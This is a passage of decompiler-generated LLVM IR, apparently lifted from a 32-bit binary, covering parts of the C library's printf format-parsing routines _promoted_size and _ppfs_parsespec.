dec_label_pc_8051efa.dec_label_pc_8051f2f.loopexit_crit_edge: ; preds = %dec_label_pc_8051ef9
  br label %dec_label_pc_8051f2f.loopexit

dec_label_pc_8051f2f.loopexit:                    ; preds = %dec_label_pc_8051efa.dec_label_pc_8051f2f.loopexit_crit_edge, %dec_label_pc_8051e83
  %v1_8051efa.lcssa = phi i32 [ %v1_8051efa, %dec_label_pc_8051efa.dec_label_pc_8051f2f.loopexit_crit_edge ], [ %v1_8051efa15, %dec_label_pc_8051e83 ]
  br label %dec_label_pc_8051f2f

dec_label_pc_8051f2f:                             ; preds = %dec_label_pc_8051f2f.loopexit, %dec_label_pc_8051f18, %dec_label_pc_8051f21
  %v10_8051f36 = phi i32 [ %v1_8051efa.lcssa, %dec_label_pc_8051f2f.loopexit ], [ %v1_8051f2c, %dec_label_pc_8051f18 ], [ %v0_8051f2f.pre, %dec_label_pc_8051f21 ]
  %v1_8051f2f = add i32 %v10_8051f36, 8
  %v2_8051f2f = inttoptr i32 %v1_8051f2f to i32*
  %v3_8051f2f = load i32, i32* %v2_8051f2f, align 4
  store i32 %v3_8051f2f, i32* %eax.global-to-local, align 4
  %v2_8051f32 = icmp slt i32 %v3_8051f2f, 0
  %v1_8051f34 = icmp eq i1 %v2_8051f32, false
  br i1 %v1_8051f34, label %dec_label_pc_8051f4a, label %dec_label_pc_8051f36

dec_label_pc_8051f36:                             ; preds = %dec_label_pc_8051f2f
  %v1_8051f36 = add i32 %v10_8051f36, 16
  %v2_8051f36 = inttoptr i32 %v1_8051f36 to i32*
  %v3_8051f36 = load i32, i32* %v2_8051f36, align 4
  %v4_8051f36 = or i32 %v3_8051f36, 8
  store i32 %v4_8051f36, i32* %v2_8051f36, align 4
  %v0_8051f3a = load i32, i32* %eax.global-to-local, align 4
  %v1_8051f3a = sub i32 0, %v0_8051f3a
  store i32 %v1_8051f3a, i32* %eax.global-to-local, align 4
  %v1_8051f3c = load i32, i32* @ecx, align 4
  %v2_8051f3c = add i32 %v1_8051f3c, 8
  %v3_8051f3c = inttoptr i32 %v2_8051f3c to i32*
  store i32 %v1_8051f3a, i32* %v3_8051f3c, align 4
  %v0_8051f3f = load i32, i32* @ecx, align 4
  %v1_8051f3f = add i32 %v0_8051f3f, 16
  %v2_8051f3f = inttoptr i32 %v1_8051f3f to i32*
  %v3_8051f3f = load i32, i32* %v2_8051f3f, align 4
  %v4_8051f3f = and i32 %v3_8051f3f, -2
  store i32 %v4_8051f3f, i32* %v2_8051f3f, align 4
  %v0_8051f43 = load i32, i32* @ecx, align 4
  %v1_8051f43 = add i32 %v0_8051f43, 20
  %v2_8051f43 = inttoptr i32 %v1_8051f43 to i32*
  store i32 32, i32* %v2_8051f43, align 4
  %v0_8051f4c.pre = load i32, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8051f4a

dec_label_pc_8051f4a:                             ; preds = %dec_label_pc_8051f2f, %dec_label_pc_8051f36
  %v0_8051f4c = phi i32 [ %v3_8051f2f, %dec_label_pc_8051f2f ], [ %v0_8051f4c.pre, %dec_label_pc_8051f36 ]
  %v2_8051f4a = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_8051f4a, i32* @ebx, align 4
  ret i32 %v0_8051f4c

; uselistorder directives
  uselistorder i32 %v3_8051f25, { 1, 0 }
  uselistorder i32 %v3_8051f0e, { 1, 0 }
  uselistorder i32 %v1_8051ef9, { 2, 1, 0 }
  uselistorder i32 %v1_8051efa, { 1, 2, 0 }
  uselistorder i32 %v3_8051e90, { 1, 0, 2 }
  uselistorder i32* %v2_8051e90, { 1, 2, 3, 4, 5, 0, 6 }
  uselistorder i32 %v1_8051e8b, { 1, 0 }
  uselistorder i32 %v6_8051e87, { 3, 4, 5, 2, 1, 0, 7, 6, 8 }
  uselistorder i32 %v1_8051e8721, { 1, 0 }
  uselistorder i32 %v1_8051efa15, { 2, 0, 1 }
  uselistorder i1 %v1_8051f08, { 1, 0 }
  uselistorder i32* %edx.global-to-local, { 6, 0, 1, 2, 3, 4, 5, 7, 8, 9, 10 }
  uselistorder i32* %ebx.global-to-local, { 1, 0, 2, 3, 4, 5, 6, 7, 8 }
  uselistorder i32 %arg1, { 1, 0, 2, 3, 4, 6, 5, 8, 7 }
  uselistorder label %dec_label_pc_8051f4a, { 1, 0 }
  uselistorder label %dec_label_pc_8051f2f, { 0, 2, 1 }
  uselistorder label %dec_label_pc_8051f18, { 1, 0 }
  uselistorder label %dec_label_pc_8051ef9, { 1, 0 }
  uselistorder label %dec_label_pc_8051ef6, { 3, 0, 1, 2 }
  uselistorder label %dec_label_pc_8051eec, { 2, 1, 0 }
  uselistorder label %dec_label_pc_8051e87, { 1, 0 }
  uselistorder label %dec_label_pc_8051e83, { 1, 0 }
  uselistorder label %dec_label_pc_8051e69, { 1, 0 }
}

define i32 @_promoted_size(i32 %arg1) local_unnamed_addr {
entry:
  %v0_8051f50 = load i32, i32* @eax, align 4
  br label %dec_label_pc_8051f57

dec_label_pc_8051f57:                             ; preds = %dec_label_pc_8051f57, %entry
  %v0_8051f57 = phi i32 [ ptrtoint (i8** @global_var_8059d4a.474 to i32), %entry ], [ %v1_8051f57, %dec_label_pc_8051f57 ]
  %v1_8051f57 = add i32 %v0_8051f57, -2
  %v1_8051f5a = inttoptr i32 %v1_8051f57 to i16*
  %v2_8051f5a = load i16, i16* %v1_8051f5a, align 2
  %v3_8051f5a = sext i16 %v2_8051f5a to i32
  %v12_8051f5d = icmp ne i32 %v3_8051f5a, %v0_8051f50
  %v6_8051f67 = icmp ugt i32 %v1_8051f57, ptrtoint (i32* @global_var_8059d32.475 to i32)
  %or.cond = and i1 %v6_8051f67, %v12_8051f5d
  br i1 %or.cond, label %dec_label_pc_8051f57, label %dec_label_pc_8051f69

dec_label_pc_8051f69:                             ; preds = %dec_label_pc_8051f57
  %.pre = add i32 %v0_8051f57, -134585652
  %v2_8051f6f = sdiv i32 %.pre, 2
  store i32 %v2_8051f6f, i32* @edx, align 4
  %v1_8051f71 = add i32 %v2_8051f6f, ptrtoint (i8** @global_var_8059d4a.474 to i32)
  %v2_8051f71 = inttoptr i32 %v1_8051f71 to i8*
  %v3_8051f71 = load i8, i8* %v2_8051f71, align 1
  %v4_8051f71 = zext i8 %v3_8051f71 to i32
  ret i32 %v4_8051f71

; uselistorder directives
  uselistorder i32 %v2_8051f6f, { 1, 0 }
  uselistorder i32 %v1_8051f57, { 1, 2, 0 }
  uselistorder i32 ptrtoint (i8** @global_var_8059d4a.474 to i32), { 1, 0 }
}

define i32 @_ppfs_parsespec(i32* %arg1) local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %ebp.global-to-local = alloca i32, align 4
  %ebx.global-to-local = alloca i32, align 4
  %ecx.global-to-local = alloca i32, align 4
  %edi.global-to-local = alloca i32, align 4
  %edx.global-to-local = alloca i32, align 4
  %esi.global-to-local = alloca i32, align 4
  %tmp66 = call i32 @__decompiler_undefined_function_0()
  %tmp76 = ptrtoint i32* %arg1 to i32
  %stack_var_-20 = alloca i32, align 4
  %stack_var_-71 = alloca i32, align 4
  %stack_var_-108 = alloca i32, align 4
  %stack_var_-16 = alloca i32, align 4
  %v0_8051f7a = load i32, i32* @edi, align 4
  %v0_8051f7b = load i32, i32* @esi, align 4
  %v0_8051f7c = load i32, i32* @ebx, align 4
  store i32 %v0_8051f7c, i32* %stack_var_-16, align 4
  %v4_8051f7c = ptrtoint i32* %stack_var_-16 to i32
  store i32 %tmp76, i32* %eax.global-to-local, align 4
  store i32 %tmp76, i32* %edx.global-to-local, align 4
  %v1_8051fa8 = add i32 %tmp76, 24
  %v2_8051fa8 = inttoptr i32 %v1_8051fa8 to i32*
  %v3_8051fa8 = load i32, i32* %v2_8051fa8, align 4
  store i32 %v3_8051fa8, i32* %eax.global-to-local, align 4
  %v1_8051faf = add i32 %tmp76, 16
  %v2_8051faf = inttoptr i32 %v1_8051faf to i32*
  %v3_8051faf = load i32, i32* %v2_8051faf, align 4
  %v1_8051fb2 = and i32 %v3_8051faf, 128
  %v2_8051fb2 = icmp eq i32 %v1_8051fb2, 0
  store i32 %v1_8051fb2, i32* %edi.global-to-local, align 4
  %v1_8051fb8 = icmp eq i1 %v2_8051fb2, false
  br i1 %v1_8051fb8, label %dec_label_pc_8051fcb, label %dec_label_pc_8051fba

dec_label_pc_8051fba:                             ; preds = %entry
  %v2_8051fba = load i32, i32* %arg1, align 4
  br label %dec_label_pc_8052018.outer

dec_label_pc_8051fc5:                             ; preds = %dec_label_pc_8052153
  %v1_8051fc5 = add i32 %v0_8052153.pre.pre, 1
  store i32 %v1_8051fc5, i32* @esi, align 4
  br label %dec_label_pc_8052163

dec_label_pc_8051fcb:                             ; preds = %entry
  %v15_8051f7d = ptrtoint i32* %stack_var_-108 to i32
  store i32 0, i32* %esi.global-to-local, align 4
  br label %dec_label_pc_8051fcd

dec_label_pc_8051fcd:                             ; preds = %dec_label_pc_8051ff5.dec_label_pc_8051fcd_crit_edge, %dec_label_pc_8051fcb
  %v2_8051fde = phi i32 [ %v2_8051fde.pre, %dec_label_pc_8051ff5.dec_label_pc_8051fcd_crit_edge ], [ %v15_8051f7d, %dec_label_pc_8051fcb ]
  %v3_8051fde = phi i32 [ %v1_8051ff5, %dec_label_pc_8051ff5.dec_label_pc_8051fcd_crit_edge ], [ 0, %dec_label_pc_8051fcb ]
  store i32 %tmp76, i32* %eax.global-to-local, align 4
  %v1_8051fd1 = mul i32 %v3_8051fde, 4
  store i32 %v1_8051fd1, i32* @ecx, align 4
  %v2_8051fd8 = load i32, i32* %arg1, align 4
  store i32 %v2_8051fd8, i32* @edx, align 4
  %v2_8051fda = add i32 %v1_8051fd1, -4
  %v3_8051fda = add i32 %v2_8051fda, %v2_8051fd8
  %v4_8051fda = inttoptr i32 %v3_8051fda to i32*
  %v5_8051fda = load i32, i32* %v4_8051fda, align 4
  store i32 %v5_8051fda, i32* %eax.global-to-local, align 4
  %v1_8051fde = trunc i32 %v5_8051fda to i8
  %v4_8051fde = add i32 %v2_8051fde, 36
  %v5_8051fde = add i32 %v4_8051fde, %v3_8051fde
  %v6_8051fde = inttoptr i32 %v5_8051fde to i8*
  store i8 %v1_8051fde, i8* %v6_8051fde, align 1
  %v0_8051fe2 = load i32, i32* %eax.global-to-local, align 4
  %v1_8051fe2 = urem i32 %v0_8051fe2, 256
  %v2_8051fe2 = load i32, i32* @ebx, align 4
  %v3_8051fe2 = and i32 %v2_8051fe2, -256
  %v4_8051fe2 = or i32 %v3_8051fe2, %v1_8051fe2
  store i32 %v4_8051fe2, i32* @ebx, align 4
  %v1_8051fe4 = mul i32 %v0_8051fe2, 16777216
  %v2_8051fe4 = sdiv i32 %v1_8051fe4, 16777216
  store i32 %v2_8051fe4, i32* %eax.global-to-local, align 4
  %v1_8051fe7 = load i32, i32* @edx, align 4
  %v2_8051fe7 = load i32, i32* @ecx, align 4
  %v3_8051fe7 = add i32 %v1_8051fe7, -4
  %v4_8051fe7 = add i32 %v3_8051fe7, %v2_8051fe7
  %v5_8051fe7 = inttoptr i32 %v4_8051fe7 to i32*
  %v6_8051fe7 = load i32, i32* %v5_8051fe7, align 4
  %v17_8051fe7 = icmp eq i32 %v2_8051fe4, %v6_8051fe7
  %v1_8051feb = icmp eq i1 %v17_8051fe7, false
  br i1 %v1_8051feb, label %dec_label_pc_805233d, label %dec_label_pc_8051ff1

dec_label_pc_8051ff1:                             ; preds = %dec_label_pc_8051fcd
  %v3_8051ff1 = trunc i32 %v0_8051fe2 to i8
  %v4_8051ff1 = icmp eq i8 %v3_8051ff1, 0
  br i1 %v4_8051ff1, label %dec_label_pc_8051ffb, label %dec_label_pc_8051ff5

dec_label_pc_8051ff5:                             ; preds = %dec_label_pc_8051ff1
  %v0_8051ff5 = load i32, i32* %esi.global-to-local, align 4
  %v1_8051ff5 = add i32 %v0_8051ff5, 1
  store i32 %v1_8051ff5, i32* %esi.global-to-local, align 4
  %tmp = icmp ult i32 %v1_8051ff5, 32
  br i1 %tmp, label %dec_label_pc_8051ff5.dec_label_pc_8051fcd_crit_edge, label %dec_label_pc_8051ffb

dec_label_pc_8051ff5.dec_label_pc_8051fcd_crit_edge: ; preds = %dec_label_pc_8051ff5
  %v2_8051fde.pre = load i32, i32* @esp, align 4
  br label %dec_label_pc_8051fcd

dec_label_pc_8051ffb:                             ; preds = %dec_label_pc_8051ff5, %dec_label_pc_8051ff1
  %v2_8052000 = ptrtoint i32* %stack_var_-71 to i32
  br label %dec_label_pc_8052018.outer

dec_label_pc_8052018.outer:                       ; preds = %dec_label_pc_8051ffb, %dec_label_pc_8051fba, %dec_label_pc_8052135
  %v0_8052024.ph94 = phi i32 [ %v1_8052135, %dec_label_pc_8052135 ], [ %v2_8051fba, %dec_label_pc_8051fba ], [ %v2_8052000, %dec_label_pc_8051ffb ]
  %stack_var_-32.1.ph = phi i32 [ %stack_var_-32.3, %dec_label_pc_8052135 ], [ %tmp66, %dec_label_pc_8051fba ], [ %tmp66, %dec_label_pc_8051ffb ]
  %stack_var_-96.1.ph = phi i32 [ %v0_8051fbe, %dec_label_pc_8052135 ], [ 0, %dec_label_pc_8051fba ], [ 0, %dec_label_pc_8051ffb ]
  %stack_var_-88.1.ph = phi i32 [ %stack_var_-88.3, %dec_label_pc_8052135 ], [ %v3_8051fa8, %dec_label_pc_8051fba ], [ %v3_8051fa8, %dec_label_pc_8051ffb ]
  %stack_var_-92.1.ph = phi i64 [ -1, %dec_label_pc_8052135 ], [ 0, %dec_label_pc_8051fba ], [ 0, %dec_label_pc_8051ffb ]
  %v7_805201f = mul nsw i64 %stack_var_-92.1.ph, -4
  %v8_805201f = trunc i64 %v7_805201f to i32
  %v2_8052027 = add i32 %v8_805201f, 80
  br label %dec_label_pc_8052018

dec_label_pc_8052018:                             ; preds = %dec_label_pc_8052018.outer, %dec_label_pc_80520d5
  %v0_8052024 = phi i32 [ %v0_80520e2, %dec_label_pc_80520d5 ], [ %v0_8052024.ph94, %dec_label_pc_8052018.outer ]
  %stack_var_-32.1 = phi i32 [ %stack_var_-32.2, %dec_label_pc_80520d5 ], [ %stack_var_-32.1.ph, %dec_label_pc_8052018.outer ]
  %stack_var_-88.1 = phi i32 [ %stack_var_-88.2, %dec_label_pc_80520d5 ], [ %stack_var_-88.1.ph, %dec_label_pc_8052018.outer ]
  store i32 %v0_8052024, i32* @edx, align 4
  %v1_8052018 = inttoptr i32 %v0_8052024 to i8*
  %v2_8052018 = load i8, i8* %v1_8052018, align 1
  %v11_8052018 = icmp eq i8 %v2_8052018, 42
  store i32 %v0_8052024, i32* @esi, align 4
  %v1_805201d = icmp eq i1 %v11_8052018, false
  br i1 %v1_805201d, label %dec_label_pc_805202f, label %dec_label_pc_805201f

dec_label_pc_805201f:                             ; preds = %dec_label_pc_8052018
  store i32 %v8_805201f, i32* %eax.global-to-local, align 4
  %v1_8052024 = add i32 %v0_8052024, 1
  store i32 %v1_8052024, i32* @esi, align 4
  %v0_8052027 = load i32, i32* @esp, align 4
  %v3_8052027 = add i32 %v2_8052027, %v0_8052027
  %v4_8052027 = inttoptr i32 %v3_8052027 to i32*
  store i32 0, i32* %v4_8052027, align 4
  %v0_8052049.pre.pre = load i32, i32* @esi, align 4
  br label %dec_label_pc_805202f

dec_label_pc_805202f:                             ; preds = %dec_label_pc_8052018, %dec_label_pc_805201f
  %v0_8052049.pre = phi i32 [ %v0_8052024, %dec_label_pc_8052018 ], [ %v0_8052049.pre.pre, %dec_label_pc_805201f ]
  %v0_805202f = load i32, i32* @global_var_805b298, align 8
  store i32 %v0_805202f, i32* %ebp.global-to-local, align 4
  store i32 0, i32* %ebx.global-to-local, align 4
  %v4_8052049.pre = load i32, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8052049

dec_label_pc_8052039:                             ; preds = %dec_label_pc_8052049
  %v1_8052039 = add i32 %v1_8052041, -4094
  %v6_8052039 = sub i32 4093, %v1_8052041
  %v7_8052039 = and i32 %v6_8052039, %v1_8052041
  %v8_8052039 = icmp slt i32 %v7_8052039, 0
  %v9_8052039 = icmp eq i32 %v1_8052039, 0
  %v10_8052039 = icmp slt i32 %v1_8052039, 0
  %v3_805203f = icmp eq i1 %v10_8052039, %v8_8052039
  %v4_805203f = icmp eq i1 %v9_8052039, false
  %v5_805203f = and i1 %v4_805203f, %v3_805203f
  br i1 %v5_805203f, label %dec_label_pc_8052048, label %dec_label_pc_8052041

dec_label_pc_8052041:                             ; preds = %dec_label_pc_8052039
  %v3_8052041 = mul i32 %v1_8052041, 10
  store i32 %v3_8052041, i32* %eax.global-to-local, align 4
  %v2_8052044 = add i32 %v3_8052041, -48
  %v3_8052044 = add i32 %v2_8052044, %v2_805204b
  store i32 %v3_8052044, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_8052048

dec_label_pc_8052048:                             ; preds = %dec_label_pc_8052039, %dec_label_pc_8052041
  %v0_805206332 = phi i32 [ %v1_8052041, %dec_label_pc_8052039 ], [ %v3_8052044, %dec_label_pc_8052041 ]
  %v4_805204928 = phi i32 [ %v6_8052049, %dec_label_pc_8052039 ], [ %v3_8052041, %dec_label_pc_8052041 ]
  %v1_8052048 = add i32 %v0_8052048, 1
  store i32 %v1_8052048, i32* @esi, align 4
  br label %dec_label_pc_8052049

dec_label_pc_8052049:                             ; preds = %dec_label_pc_805202f, %dec_label_pc_8052048
  %v1_8052041 = phi i32 [ 0, %dec_label_pc_805202f ], [ %v0_805206332, %dec_label_pc_8052048 ]
  %v4_8052049 = phi i32 [ %v4_8052049.pre, %dec_label_pc_805202f ], [ %v4_805204928, %dec_label_pc_8052048 ]
  %v0_8052048 = phi i32 [ %v0_8052049.pre, %dec_label_pc_805202f ], [ %v1_8052048, %dec_label_pc_8052048 ]
  %v1_8052049 = inttoptr i32 %v0_8052048 to i8*
  %v2_8052049 = load i8, i8* %v1_8052049, align 1
  %v3_8052049 = zext i8 %v2_8052049 to i32
  %v5_8052049 = and i32 %v4_8052049, -256
  %v6_8052049 = or i32 %v3_8052049, %v5_8052049
  store i32 %v6_8052049, i32* %eax.global-to-local, align 4
  %v2_805204b = sext i8 %v2_8052049 to i32
  store i32 %v2_805204b, i32* @ecx, align 4
  %v2_805204e = mul nsw i32 %v2_805204b, 2
  %v3_805204e = add i32 %v2_805204e, %v0_805202f
  %v4_805204e = inttoptr i32 %v3_805204e to i8*
  %v5_805204e = load i8, i8* %v4_805204e, align 1
  %v6_805204e = and i8 %v5_805204e, 8
  %v7_805204e = icmp eq i8 %v6_805204e, 0
  %v1_8052053 = icmp eq i1 %v7_805204e, false
  br i1 %v1_8052053, label %dec_label_pc_8052039, label %dec_label_pc_8052055

dec_label_pc_8052055:                             ; preds = %dec_label_pc_8052049
  %v0_8052055 = load i32, i32* @edx, align 4
  %v1_8052055 = add i32 %v0_8052055, -1
  %v2_8052055 = inttoptr i32 %v1_8052055 to i8*
  %v3_8052055 = load i8, i8* %v2_8052055, align 1
  %v12_8052055 = icmp eq i8 %v3_8052055, 37
  %v1_8052059 = icmp eq i1 %v12_8052055, false
  br i1 %v1_8052059, label %dec_label_pc_80520ec, label %dec_label_pc_805205f

dec_label_pc_805205f:                             ; preds = %dec_label_pc_8052055
  %v10_805205f = icmp eq i8 %v2_8052049, 36
  %v1_8052061 = icmp eq i1 %v10_805205f, false
  br i1 %v1_8052061, label %dec_label_pc_8052093, label %dec_label_pc_8052063

dec_label_pc_8052063:                             ; preds = %dec_label_pc_805205f
  %tmp89 = icmp slt i32 %v1_8052041, 1
  br i1 %tmp89, label %dec_label_pc_8052093, label %dec_label_pc_8052067

dec_label_pc_8052067:                             ; preds = %dec_label_pc_8052063
  %v4_8052067 = icmp eq i32 %stack_var_-88.1, 0
  %v1_805206c = add i32 %v0_8052048, 1
  store i32 %v1_805206c, i32* @edx, align 4
  br i1 %v4_8052067, label %dec_label_pc_805233d, label %dec_label_pc_8052075

dec_label_pc_8052075:                             ; preds = %dec_label_pc_8052067
  store i32 %stack_var_-88.1, i32* %ecx.global-to-local, align 4
  %v2_805207d = sub i32 %v1_8052041, %stack_var_-88.1
  %v8_805207d = xor i32 %v1_8052041, %stack_var_-88.1
  %v9_805207d = xor i32 %v2_805207d, %v1_8052041
  %v10_805207d = and i32 %v9_805207d, %v8_805207d
  %v11_805207d = icmp slt i32 %v10_805207d, 0
  %v12_805207d = icmp eq i32 %v2_805207d, 0
  %v13_805207d = icmp slt i32 %v2_805207d, 0
  %v3_805207f = icmp ne i1 %v13_805207d, %v11_805207d
  %v4_805207f = or i1 %v12_805207d, %v3_805207f
  %stack_var_-88.1.v0_8052081 = select i1 %v4_805207f, i32 %stack_var_-88.1, i32 %v1_8052041
  br label %dec_label_pc_805208f

dec_label_pc_805208f:                             ; preds = %dec_label_pc_80520a3, %dec_label_pc_8052075, %dec_label_pc_80520a7
  %v0_805208f = phi i32 [ %v1_805206c, %dec_label_pc_8052075 ], [ %v0_8052055, %dec_label_pc_80520a7 ], [ %v0_8052055, %dec_label_pc_80520a3 ]
  %stack_var_-32.2 = phi i32 [ %v1_8052041, %dec_label_pc_8052075 ], [ %stack_var_-32.1, %dec_label_pc_80520a7 ], [ %stack_var_-32.1, %dec_label_pc_80520a3 ]
  %stack_var_-88.2 = phi i32 [ %stack_var_-88.1.v0_8052081, %dec_label_pc_8052075 ], [ 0, %dec_label_pc_80520a7 ], [ 0, %dec_label_pc_80520a3 ]
  store i32 %v0_805208f, i32* @esi, align 4
  br label %dec_label_pc_80520b6

dec_label_pc_8052093:                             ; preds = %dec_label_pc_8052063, %dec_label_pc_805205f
  %tmp90 = icmp slt i32 %stack_var_-88.1, 1
  br i1 %tmp90, label %dec_label_pc_80520a3, label %dec_label_pc_805209a

dec_label_pc_805209a:                             ; preds = %dec_label_pc_8052093
  %v10_805209a = icmp eq i8 %v2_8052049, 109
  br i1 %v10_805209a, label %dec_label_pc_80520ec, label %dec_label_pc_805233d

dec_label_pc_80520a3:                             ; preds = %dec_label_pc_8052093
  %tmp153 = icmp ugt i32 %v0_8052048, %v0_8052055
  br i1 %tmp153, label %dec_label_pc_80520a7, label %dec_label_pc_805208f

dec_label_pc_80520a7:                             ; preds = %dec_label_pc_80520a3
  %v1_80520a7 = inttoptr i32 %v0_8052055 to i8*
  %v2_80520a7 = load i8, i8* %v1_80520a7, align 1
  %v8_80520a7 = icmp eq i8 %v2_80520a7, 48
  br i1 %v8_80520a7, label %dec_label_pc_805208f, label %dec_label_pc_80520ec

dec_label_pc_80520b6:                             ; preds = %dec_label_pc_80520c7, %dec_label_pc_805208f
  %v0_80520e2 = phi i32 [ %v1_80520c7, %dec_label_pc_80520c7 ], [ %v0_805208f, %dec_label_pc_805208f ]
  %v4_80520c035 = phi i32 [ %v6_80520c0, %dec_label_pc_80520c7 ], [ %v6_8052049, %dec_label_pc_805208f ]
  store i32 ptrtoint ([8 x i8]* @global_var_8059d2a.476 to i32), i32* %edx.global-to-local, align 4
  %v1_80520c3 = inttoptr i32 %v0_80520e2 to i8*
  br label %dec_label_pc_80520c0

dec_label_pc_80520c0:                             ; preds = %dec_label_pc_80520d1, %dec_label_pc_80520b6
  %v4_80520c0 = phi i32 [ %v4_80520c035, %dec_label_pc_80520b6 ], [ %v6_80520c0, %dec_label_pc_80520d1 ]
  %v0_80520c2 = phi i32 [ ptrtoint ([8 x i8]* @global_var_8059d2a.476 to i32), %dec_label_pc_80520b6 ], [ %v1_80520c2, %dec_label_pc_80520d1 ]
  %v0_80520d1 = phi i32 [ 1, %dec_label_pc_80520b6 ], [ %v2_80520d1, %dec_label_pc_80520d1 ]
  store i32 %v0_80520d1, i32* @ecx, align 4
  %v1_80520c0 = inttoptr i32 %v0_80520c2 to i8*
  %v2_80520c0 = load i8, i8* %v1_80520c0, align 1
  %v3_80520c0 = zext i8 %v2_80520c0 to i32
  %v5_80520c0 = and i32 %v4_80520c0, -256
  %v6_80520c0 = or i32 %v3_80520c0, %v5_80520c0
  store i32 %v6_80520c0, i32* %eax.global-to-local, align 4
  %v1_80520c2 = add i32 %v0_80520c2, 1
  store i32 %v1_80520c2, i32* @edx, align 4
  %v2_80520c3 = load i8, i8* %v1_80520c3, align 1
  %v15_80520c3 = icmp eq i8 %v2_80520c3, %v2_80520c0
  %v1_80520c5 = icmp eq i1 %v15_80520c3, false
  br i1 %v1_80520c5, label %dec_label_pc_80520cc, label %dec_label_pc_80520c7

dec_label_pc_80520c7:                             ; preds = %dec_label_pc_80520c0
  %v1_80520c7 = add i32 %v0_80520e2, 1
  store i32 %v1_80520c7, i32* @esi, align 4
  %v0_80520c8 = load i32, i32* %edi.global-to-local, align 4
  %v2_80520c8 = or i32 %v0_80520c8, %v0_80520d1
  store i32 %v2_80520c8, i32* %edi.global-to-local, align 4
  br label %dec_label_pc_80520b6

dec_label_pc_80520cc:                             ; preds = %dec_label_pc_80520c0
  %v1_80520cc = inttoptr i32 %v1_80520c2 to i8*
  %v2_80520cc = load i8, i8* %v1_80520cc, align 1
  %v3_80520cc = icmp eq i8 %v2_80520cc, 0
  br i1 %v3_80520cc, label %dec_label_pc_80520d5, label %dec_label_pc_80520d1

dec_label_pc_80520d1:                             ; preds = %dec_label_pc_80520cc
  %v2_80520d1 = mul i32 %v0_80520d1, 2
  br label %dec_label_pc_80520c0

dec_label_pc_80520d5:                             ; preds = %dec_label_pc_80520cc
  %v0_80520d5 = load i32, i32* %edi.global-to-local, align 4
  store i32 0, i32* %ebx.global-to-local, align 4
  %v1_80520d9 = udiv i32 %v0_80520d5, 2
  %v1_80520d9.not = or i32 %v1_80520d9, -6
  %v1_80520de = xor i32 %v1_80520d9.not, 5
  store i32 %v1_80520de, i32* %eax.global-to-local, align 4
  %v2_80520e0 = and i32 %v1_80520de, %v0_80520d5
  store i32 %v2_80520e0, i32* %edi.global-to-local, align 4
  %v1_80520e2 = add i32 %v0_80520e2, -1
  %v2_80520e2 = inttoptr i32 %v1_80520e2 to i8*
  %v3_80520e2 = load i8, i8* %v2_80520e2, align 1
  %v12_80520e2 = icmp eq i8 %v3_80520e2, 37
  %v1_80520e6 = icmp eq i1 %v12_80520e2, false
  br i1 %v1_80520e6, label %dec_label_pc_8052018, label %dec_label_pc_80520ec

dec_label_pc_80520ec:                             ; preds = %dec_label_pc_80520a7, %dec_label_pc_80520d5, %dec_label_pc_8052055, %dec_label_pc_805209a
  %v0_805210f = phi i32 [ %v1_8052041, %dec_label_pc_805209a ], [ %v1_8052041, %dec_label_pc_80520a7 ], [ 0, %dec_label_pc_80520d5 ], [ %v1_8052041, %dec_label_pc_8052055 ]
  %v1_8052118 = phi i32 [ %v0_8052048, %dec_label_pc_805209a ], [ %v0_8052048, %dec_label_pc_80520a7 ], [ %v0_80520e2, %dec_label_pc_80520d5 ], [ %v0_8052048, %dec_label_pc_8052055 ]
  %v0_8052115 = phi i32 [ %v0_8052055, %dec_label_pc_805209a ], [ %v0_8052055, %dec_label_pc_80520a7 ], [ %v1_80520c2, %dec_label_pc_80520d5 ], [ %v0_8052055, %dec_label_pc_8052055 ]
  %stack_var_-32.3 = phi i32 [ %stack_var_-32.1, %dec_label_pc_805209a ], [ %stack_var_-32.1, %dec_label_pc_80520a7 ], [ %stack_var_-32.2, %dec_label_pc_80520d5 ], [ %stack_var_-32.1, %dec_label_pc_8052055 ]
  %stack_var_-88.3 = phi i32 [ %stack_var_-88.1, %dec_label_pc_805209a ], [ 0, %dec_label_pc_80520a7 ], [ %stack_var_-88.2, %dec_label_pc_80520d5 ], [ %stack_var_-88.1, %dec_label_pc_8052055 ]
  %v1_80520ec = inttoptr i32 %v0_8052115 to i8*
  %v2_80520ec = load i8, i8* %v1_80520ec, align 1
  %v11_80520ec = icmp eq i8 %v2_80520ec, 42
  %v1_80520ef = icmp eq i1 %v11_80520ec, false
  br i1 %v1_80520ef, label %dec_label_pc_8052125, label %dec_label_pc_80520f1

dec_label_pc_80520f1:                             ; preds = %dec_label_pc_80520ec
  %v4_80520f1 = icmp eq i32 %stack_var_-88.3, 0
  br i1 %v4_80520f1, label %dec_label_pc_8052115, label %dec_label_pc_80520f8

dec_label_pc_80520f8:                             ; preds = %dec_label_pc_80520f1
  %v1_80520f8 = inttoptr i32 %v1_8052118 to i8*
  %v2_80520f8 = load i8, i8* %v1_80520f8, align 1
  %v11_80520f8 = icmp eq i8 %v2_80520f8, 36
  %v1_80520fb = icmp eq i1 %v11_80520f8, false
  br i1 %v1_80520fb, label %dec_label_pc_805233d, label %dec_label_pc_8052101

dec_label_pc_8052101:                             ; preds = %dec_label_pc_80520f8
  %tmp91 = icmp slt i32 %v0_805210f, 1
  br i1 %tmp91, label %dec_label_pc_805233d, label %dec_label_pc_8052109

dec_label_pc_8052109:                             ; preds = %dec_label_pc_8052101
  store i32 %v8_805201f, i32* %eax.global-to-local, align 4
  %v1_805210e = add i32 %v1_8052118, 1
  store i32 %v1_805210e, i32* @esi, align 4
  %v1_805210f = load i32, i32* @esp, align 4
  %v3_805210f = add i32 %v8_805201f, 68
  %v4_805210f = add i32 %v3_805210f, %v1_805210f
  %v5_805210f = inttoptr i32 %v4_805210f to i32*
  store i32 %v0_805210f, i32* %v5_805210f, align 4
  %v0_8052153.pre.pre.pre.pre = load i32, i32* @esi, align 4
  br label %dec_label_pc_8052120

dec_label_pc_8052115:                             ; preds = %dec_label_pc_80520f1
  %v1_8052115 = add i32 %v0_8052115, 1
  store i32 %v1_8052115, i32* %eax.global-to-local, align 4
  %v12_8052118 = icmp eq i32 %v1_8052115, %v1_8052118
  %v1_805211a = icmp eq i1 %v12_8052118, false
  br i1 %v1_805211a, label %dec_label_pc_805233d, label %dec_label_pc_8052120

dec_label_pc_8052120:                             ; preds = %dec_label_pc_8052115, %dec_label_pc_8052109
